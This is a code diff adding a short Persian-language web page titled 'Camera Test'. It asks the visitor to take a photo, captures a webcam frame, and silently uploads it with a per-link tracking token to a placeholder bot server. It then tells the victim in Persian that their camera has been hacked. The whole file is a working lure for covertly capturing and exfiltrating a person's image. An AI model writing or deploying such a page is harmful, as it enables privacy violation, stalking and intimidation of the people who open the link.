@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+<meta charset="UTF-8">
+<title>Camera Test</title>
+</head>
+<body>
+<h3>زود باش</h3>
+<video id="video" autoplay></video><br>
+<button onclick="takePhoto()">عکس بگیر</button>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+const token = new URLSearchParams(window.location.search).get("t");
+const video = document.getElementById("video");
+
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => video.srcObject = stream);
+
+function takePhoto(){
+  const canvas = document.getElementById("canvas");
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext("2d").drawImage(video,0,0);
+
+  canvas.toBlob(blob => {
+    const form = new FormData();
+    form.append("photo", blob);
+    form.append("token", token);
+
+    fetch("https://YOUR_BOT_SERVER/upload", {
+      method: "POST",
+      body: form
+    });
+
+    alert("دوربینت هک شده💀");
+  });
+}
+</script>
+</body>
+</html>
